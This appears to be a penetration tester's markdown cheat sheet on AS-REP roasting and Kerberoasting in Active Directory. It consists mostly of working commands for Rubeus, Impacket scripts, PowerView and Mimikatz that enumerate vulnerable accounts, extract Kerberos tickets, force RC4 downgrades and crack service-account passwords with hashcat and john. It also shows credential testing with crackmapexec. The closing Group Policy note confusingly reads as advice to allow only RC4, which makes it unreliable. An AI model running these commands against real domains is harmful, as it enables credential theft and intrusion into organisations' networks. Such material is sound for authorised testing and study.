# Content

# Roasting attacks

## AS-REQ Roasting
- AS-REQ Roasting is possible when Kerberos pre-authentication is not configured. This allows anyone to request authentication data for a user. In return, the KDC would provide an AS-REP message. 
- Since part of that message is encrypted using the user’s password, it is possible to perform an offline brute-force attack to try and retrieve the user's password.
- The only information an attacker requires is the username they want to attack, which can also be found using other enumeration techniques.
-  if you have `GenericWrite/GenericAll` rights over a target user, you can maliciously modify their userAccountControl to not require preauth, use ASREPRoast, and then reset the value


it's possible to obtain the TGT for any account that has the "Do not require Kerberos preauthentication" setting enabled.
![Screenshot 2024-06-18 at 12-41-52 8 Powerful Kerberos attacks (that analysts hate)](https://github.com/kiro6/penetration-testing-notes/assets/57776872/ebe87f88-c284-4848-ae60-bf1cedd3316c)


### Enumerating vulnerable users (need domain credentials)
```shell
# windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView

# Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
```

### Request AS_REP message
```
# Windows 
## Rubeus 
### This will automatically find all accounts that do not require preauthentication and extract their AS-REP hashes
.\Rubeus.exe asreproast 
### Targeted account
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]


## From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
Get-ASREPHash -Username VPN114user -verbose 

# Linux
## Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

##Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
### crack
```shell
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
```

## Kerberoasting 
Kerberoasting is an attack against service accounts that allows an attacker to perform an offline password-cracking attack against the Active Directory account associated with the service. 

### From Linux 

**GetUserSPNs.py**
```shell
# Listing SPN Accounts with GetUserSPNs.py
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Requesting all TGS Tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

# Requesting a Single TGS ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# Saving the TGS Ticket to an Output File
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

**Cracking the Ticket Offline with Hashcat**
```shell
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

**Testing Authentication against a Domain Controller**
```shell
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
### from Windows

#### setspn.exe manual method 
Enumerating SPNs and request tickets with setspn.exe

```powershell
# Enumerating SPNs
setspn.exe -Q */*

# Targeting a Single User Ticket
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Retrieving All Tickets Using setspn.exe
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Extracting Tickets from Memory with Mimikatz , after requesting the tickets using `setspn.exe` now we need to extract it 
``` powershell
# extract tickets as .kirbi
.\mimikatz.exe  "kerberos::list /export" "exit"

# extract tickets as base64
.\mimikatz.exe "base64 /out:true" "kerberos::list /export" "exit"

# Preparing the Base64 Blob for Cracking
echo "<base64 blob>" |  tr -d \\n 

# Placing the Output into a File as .kirbi
cat encoded_file | base64 -d > sqldev.kirbi

# Extracting the Kerberos Ticket using kirbi2john.py (This will create a file called crack_file)
kirbi2john sqldev.kirbi

# Modifiying crack_file for Hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Cracking the Hash with Hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

#### PowerView method 

```powershell
# Using PowerView to enumrate SPNs
import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

# Using PowerView to Target a Specific User
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Exporting All Tickets to a CSV File
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

```

#### Rubeus method 

```powershell
# Using the /stats Flag (get SPNs count , encryption types and latest change date)
.\Rubeus.exe kerberoast /stats

# get ticket (we can see the supported Encryption type also)
.\Rubeus.exe kerberoast /user:testspn /nowrap

# Using the /nowrap Flag ( nowrap flag prevents any base64 ticket blobs from being column wrapped for any function)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### Encryption Types
- check the [chart](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) to see every decmial value and the corresponding encryption type
- check hashcat [hashs' id](https://hashcat.net/wiki/doku.php?id=example_hashes)
```powershell
# check encryption type
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

# get ticket (we can see the supported Encryption type also)
.\Rubeus.exe kerberoast /user:testspn /nowrap

# downgrade to RC4
.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
```
| Hash Prefix       | Encryption Type | Etype Number | Hashcat ID |
|-------------------|-----------------|--------------|------------|
| $krb5tgs$23$      | RC4-HMAC        | 23           | 13100      |
| $krb5tgs$17$      | AES-128         | 17           | 19600      |
| $krb5tgs$18$      | AES-256         | 18           | 19700      |


```powershell 
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt

hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

- `RC4` is the fastest to crack
- downgrading do not work after windows server 2019 and above
- Windows Server 2019 Domain Controller will always return a service ticket encrypted with the highest level of encryption supported by the target account. 
- Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets
- edit encryption types used by Kerberos
```
It is possible to edit the encryption types used by Kerberos.
This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options,
then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos.
Removing all other encryption types except for RC4_HMAC_MD5
```
